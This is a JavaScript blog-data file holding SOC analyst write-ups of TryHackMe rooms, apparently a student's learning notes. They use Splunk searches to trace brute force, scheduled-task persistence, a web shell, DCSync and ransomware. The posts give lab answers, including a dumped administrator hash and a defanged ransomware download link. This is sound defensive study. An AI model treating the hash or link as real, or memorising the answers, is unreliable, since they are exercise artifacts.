<h3>Question 13</h3>
<p><strong>Question:</strong> The attacker then dumped the hashes in this second machine. What is the username and hash of the newly dumped credentials? (format: username:hash)</p>
<p><strong>Walkthrough:</strong> Continuing through the same search results reveals a new set of previously unseen dumped credentials.</p>
<img src="Images/Pasted%20image%2020260608223953.png" alt="Newly dumped administrator hash on second machine" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer: administrator:00f80f2538dcb54e7adc715c0e7091ec</strong></p>
<h3>Question 14</h3>
<p><strong>Question:</strong> After gaining access to the domain controller, the attacker attempted to dump the hashes via a DCSync attack. Aside from the administrator account, what account did the attacker dump?</p>
<p><strong>Walkthrough:</strong> Searching for DCSync events:</p>
<pre><code>*dcsync*</code></pre>
<img src="Images/Pasted%20image%2020260608225004.png" alt="DCSync attack revealing backupda account" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>An event containing DCSync in the command line reveals a new, previously unseen account.</p>
<p><strong>Answer: backupda</strong></p>
<h3>Question 15</h3>
<p><strong>Question:</strong> After dumping the hashes, the attacker attempted to download another remote file to execute ransomware. What is the link used by the attacker to download the ransomware binary?</p>
<p><strong>Walkthrough:</strong> Searching for the ransomware executable name spotted earlier:</p>
<pre><code>*ransomboogey*</code></pre>
<img src="Images/Pasted%20image%2020260608225620.png" alt="Download link for ransomboogey.exe" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>Scrolling through the results reveals the exact download link used.</p>
<p><strong>Answer: hxxp://ff[.]sillytechninja[.]io/ransomboogey[.]exe</strong></p>
<hr>
<h2>Final Thoughts</h2>
<p>This was the most difficult room of the Boogeyman series, largely due to unfamiliarity with certain tool names and attack techniques. To become a SOC Analyst, I need to acquaint myself with more attack patterns and simulate them while documenting my findings.</p>`,
            github: ''
        }
        };

        // Blog posts data - SINGLE DEFINITION
        const blogPostsData = [
            {
                id: 1,
                title: "Alert Triage With Splunk",
                date: "30th May, 2026",
                readTime: "15 min read",
                excerpt: "My first cybersecurity write-up: triaging brute-force, persistence, and web-shell alerts as a Level 1 SOC Analyst using Splunk SPL.",
                tags: ["Splunk", "SOC", "TryHackMe", "Alert Triage"],
                content: 
                `<h2>Notes</h2>
<p>This is my first write-up in cybersecurity. I am at around 90% completion of TryHackMe's SOC Analyst L1 path. I have found the learning path incredibly insightful, and it has increased my excitement about entering the industry.</p>
<p>This room is a walkthrough, so some information is provided directly. Because of that, I will skim over parts of the guided content and focus more on how I answered the questions. Future write-ups will cover harder rooms or implementations completed independently.</p>

<h2>Introduction</h2>
<p>One of the main responsibilities of a SOC Analyst is alert triage through a SIEM (Security Information and Event Management) platform.</p>
<p>A SIEM aggregates data from many different sources such as EDR tools, firewalls, applications, and endpoints. That data can then be used by analysts to build alerts that support their monitoring and detection needs.</p>
<p>Splunk is a SIEM that is managed through the browser. It is widely known as one of the most popular tools because it ingests data from many different sources, has a powerful Search Processing Language (SPL), and scales well.</p>
<p>In this room, I explore different scenarios as if I were a Level 1 SOC Analyst on shift, and I also explain how I approached each scenario.</p>

<h2>Task 1</h2>
<p><strong>Description:</strong> You've just started your first shift as an analyst at an MSSP. Only a few minutes have passed since an alert about a possible brute-force attack appeared on the platform.</p>
<p><strong>Alert Details:</strong></p>
<ul>
<li><strong>Alert Name:</strong> Brute Force Activity Detection</li>
<li><strong>Time:</strong> 2025-09-17 09:00:21</li>
<li><strong>Target Host:</strong> tryhackme-2404</li>
<li><strong>Source IP:</strong> 10[.]10[.]242[.]248</li>
</ul>
<p>Your job is to investigate this activity and decide whether it should be considered suspicious.</p>
<p>Before diving into the issue, the information provided suggests there should be many alerts indicating that a single IP is attempting to gain access to an account or service. These alerts would likely include messages such as "Wrong Password" or "Access Denied." The fact that the IP address is within the 10.0.0.0-10.255.255.255 range means it is a private IP address, which suggests the source is already inside the network in some way.</p>
<p>The task walkthrough shows the search queries used to investigate the brute-force activity, including searches for login messages associated with the source IP address. The next query identified how many attempts each user made, and it showed that a user called <strong>john.smith</strong> had a large number of attempts against the target host, with a successful login eventually occurring. This means the alert is a true positive and requires further investigation into what the attacker did after gaining access.</p>
<p>Questions to think about include:</p>
<ul>
<li>Why did the attacker have a private IP address?</li>
<li>How did the attacker obtain the information needed to brute-force accounts?</li>
<li>What did the attacker do after gaining access?</li>
</ul>

<h3>Question 1</h3>
<p><strong>Question:</strong> How many failed login attempts were made on the user john.smith?</p>
<p><strong>Walkthrough:</strong> We already know that john.smith is the affected account, so all that is needed is a search query for events containing john.smith and failed-password activity.</p>
<pre><code>index="linux-alert" user="john.smith" "Failed Password"</code></pre>
<p>The results show 500 events.</p>
<p><strong>Answer: 500</strong></p>

<h3>Question 2</h3>
<p><strong>Question:</strong> What was the duration of the brute-force attack in minutes?</p>
<p><strong>Walkthrough:</strong> Just below the search bar, there is a timeline showing all relevant events and when john.smith first became the focus of the brute-force activity.</p>
<p>All of the green bars add up to 500 events, and each full bar represents 1 minute. I first answered 6 minutes because that is what Splunk appeared to show, but the correct answer was 5 after rounding down.</p>
<p><strong>Answer: 5</strong></p>

<h3>Question 3</h3>
<p><strong>Question:</strong> What username was the attacker able to privilege escalate to?</p>
<p><strong>Walkthrough:</strong> For a user to privilege escalate, they need suitable permissions. Because the attack is on a Linux machine, commands such as <code>sudo</code> or <code>su</code> would commonly be used to gain elevated privileges.</p>
<pre><code>index="linux-alert" john.smith sudo OR su</code></pre>
<p>john.smith is no longer tied only to the <code>user</code> field, because alerts that included <code>user: john.smith</code> would be shown and a broader search is more useful here. The results show that a session was opened for root, which means the attacker obtained root access.</p>
<p><strong>Answer: root</strong></p>

<h3>Question 4</h3>
<p><strong>Question:</strong> What is the name of the user account created by the attacker for persistence?</p>
<p><strong>Walkthrough:</strong> It was already established that john.smith used <code>sudo</code> to gain root privileges, so the new user was likely created through either <code>sudo adduser</code> or <code>sudo useradd</code>.</p>
<pre><code>index="linux-alert" (useradd OR adduser)</code></pre>
<p>I found an event linked with <strong>john.smith</strong> and <code>adduser</code>, which showed that the new account was <strong>system-utm</strong>.</p>
<p><strong>Answer: system-utm</strong></p>

<h2>Task 2</h2>
<p>This task focuses on persistence, which involves an attacker maintaining access to a system, server, or application so they can return later to achieve their goals.</p>
<p><strong>Description:</strong> You are working as a Level 1 SOC Analyst on shift at an MSSP. An alert has come through indicating that a suspicious scheduled task was created on a host.</p>
<p><strong>Alert Details:</strong></p>
<ul>
<li><strong>Alert Name:</strong> Potential Task Scheduler Identified</li>
<li><strong>Time:</strong> 2025-08-30 10:06:07</li>
<li><strong>Host:</strong> WIN-H015</li>
<li><strong>User:</strong> oliver.thompson</li>
<li><strong>Task Name:</strong> AssessmentTaskOne</li>
</ul>
<p>Your job is to investigate this activity and decide whether it should be considered suspicious.</p>
<p>At first glance, this appears to be a newly created task, so there is not much to work with immediately. My first thought was that the attacker may have created or abused a user account with the privileges they needed, similar to the previous task.</p>
<p>The walkthrough suggests not diving too deeply too early. Instead, it asks whether the host is a workstation or a server, what role the user has, and when the activity occurred. In this case, the host is a workstation, the user is a systems engineer with elevated privileges, and the event occurred during working hours. However, 30 August 2025 was a Saturday, which makes it more likely that an attacker had gained access to Oliver's account.</p>
<p>The walkthrough then uses a search query to find the scheduled-task event. The task shows that it runs every day at a certain time and was created under the account <strong>oliver.thompson</strong>. The next section of the log shows that the scheduled task runs a PowerShell command using <code>certutil</code>, which is built into Windows and can download files without requiring external tools. The command downloads an executable called <code>datacollector.exe</code> into the temp folder, and it is configured to run under <strong>oliver.thompson</strong>.</p>

<h3>Question 1</h3>
<p><strong>Question:</strong> What is the ProcessId of the process that created this malicious task?</p>
<p><strong>Walkthrough:</strong> This is straightforward and uses the following query:</p>
<pre><code>index="win-alert" datacollector.exe processid:</code></pre>
<p>Only one event appears, and the ProcessId is highlighted in the results.</p>
<p><strong>Answer: 5816</strong></p>

<h3>Question 2</h3>
<p><strong>Question:</strong> What is the name of the parent process for the process that created this malicious task?</p>
<p><strong>Walkthrough:</strong> The required event has already been identified. By scrolling to the bottom, the <strong>ParentCommandLine</strong> field shows that it was executed by <code>cmd.exe</code>.</p>
<p><strong>Answer: cmd.exe</strong></p>

<h3>Question 3</h3>
<p><strong>Question:</strong> Which local group did the attacker enumerate during discovery?</p>
<p><strong>Walkthrough:</strong> Another query was needed, so I used:</p>
<pre><code>index="win-alert" oliver.thompson group name</code></pre>
<p>The first event provided the required information, showing that the attacker enumerated the <strong>Administrators</strong> group.</p>
<p><strong>Answer: Administrators</strong></p>

<h3>Question 4</h3>
<p><strong>Question:</strong> What is the name of the workstation from which the threat actor logged into this host?</p>
<p><strong>Walkthrough:</strong> This was another simple query:</p>
<pre><code>index="win-alert" oliver.thompson workstation:</code></pre>
<p>There are only five events. The first is the original host machine, while the other events show <strong>DEV-QA-SERVER</strong>.</p>
<p><strong>Answer: DEV-QA-SERVER</strong></p>

<h2>Task 3</h2>
<p>This task focuses on investigating possible web-shell exploitation on a vulnerable web server.</p>
<p>Your shift as an L1 analyst continues, and you've now received the next alert that needs to be investigated. This time, the activity is related to the web.</p>
<p><strong>Alert Details:</strong></p>
<ul>
<li><strong>Alert Name:</strong> Potential Web Shell Upload Detected</li>
<li><strong>Time:</strong> 2025-09-14 09:31:51</li>
<li><strong>Resource:</strong> http://web.trywinme.thm</li>
<li><strong>Suspicious IP:</strong> 171[.]251[.]232[.]40</li>
</ul>
<p>Your job is to investigate this activity and decide whether it should be considered suspicious.</p>
<p>Before looking at the walkthrough, my first thought was that the attacker may have implemented command-and-control activity so they could maintain communication with the server and execute commands to achieve their goals. This user is not impersonating anyone within the company, so the activity clearly appears to be from an external malicious actor.</p>
<p>The walkthrough begins by focusing on where the attack is taking place. It is targeting the website hosted on the web server. The suspicious IP is the next focal point, and the walkthrough shows a lookup on AbuseIPDB that reports the IP address as having a history of malicious activity.</p>
<p>The walkthrough then uses a search query to learn more about the attacker on the web server by checking the IP address, the tool used, the targeted URL path, and HTTP 200 status codes that indicate successful page requests. The tool used to gain access was Hydra Network Login Tool, but that still does not identify the web-shell exploitation tool itself.</p>
<p>The walkthrough then becomes more specific in trying to identify the tool used for the web-shell activity, because the initial results did not show it clearly. Later, it finds a file related to the activity because the relevant events show four POST requests to the same file. The file is named <code>b374k.php</code>.</p>
<p>At that point, the file name was searched online, and the results indicated that it is associated with a known web shell. Based on that information, the alert is treated as a true positive and warrants further investigation.</p>

<h3>Question 1</h3>
<p><strong>Question:</strong> What time did the brute-force activity using Hydra begin?</p>
<p><strong>Walkthrough:</strong> We already know the IP address and the tool that was used, so the search query can be fairly simple:</p>
<pre><code>index="web-alert" clientip="171.251.232.40" useragent="Mozilla/5.0 (Hydra)"
| sort +_time</code></pre>
<p>By using the information already known and sorting for the earliest event, the first matching result reveals the date and time.</p>
<p><strong>Answer: 2025-09-14 21:20:27</strong></p>

<h3>Question 2</h3>
<p><strong>Question:</strong> Which user agent did the attacker use when interacting with the web shell?</p>
<p><strong>Walkthrough:</strong> The required information is already available. The IP address is known, and the <code>.php</code> file name is also known. The Hydra user agent is removed from the search focus so that the user agent tied to the web-shell interaction can be identified instead.</p>
<pre><code>index="web-alert" clientip="171.251.232.40" b374k.php
| table _time clientip useragent</code></pre>
<p>Only five events appear, and they all contain the same value in the <code>useragent</code> field.</p>
<p><strong>Answer: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</strong></p>

<h3>Question 3</h3>
<p><strong>Question:</strong> What was the number of requests made by the attacker to the server via the web shell?</p>
<p>We already have the events where the attacker interacted with the web shell, but the table can be made clearer so the request method is easier to identify.</p>
<pre><code>index="web-alert" clientip="171.251.232.40" b374k.php
| table _time clientip useragent method
| sort -method</code></pre>
<p>This query returns the same five events, but only four of them use the POST method, which means the attacker interacted with the web shell four times.</p>
<p><strong>Answer: 4</strong></p>

<h2>Final Thoughts</h2>
<p>This room taught me not to dive into the investigation too quickly. Even though a lot of information was provided in this room, a real-world situation would not present the same level of guidance.</p>
<p>This room is marked as medium difficulty, but it felt easier than other medium rooms because so much information was already provided. One of the most useful takeaways was seeing how the search queries became more specific as more information was uncovered about the attackers and their methods, which gave me better insight into how SOC Analyst L1s operate.</p>`
            }
        ];
